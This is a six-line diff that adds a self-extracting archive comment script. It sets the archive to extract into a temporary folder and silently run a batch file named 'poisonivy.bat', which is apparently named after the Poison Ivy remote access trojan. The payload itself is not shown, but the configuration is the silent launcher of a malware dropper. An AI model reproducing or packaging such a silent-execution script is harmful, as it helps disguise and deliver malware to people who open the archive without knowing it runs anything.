@@ -1,0 +1,6 @@
+;The comment below contains SFX script commands
+
+Setup=poisonivy.bat
+SetupCode=0
+TempMode
+Silent=1
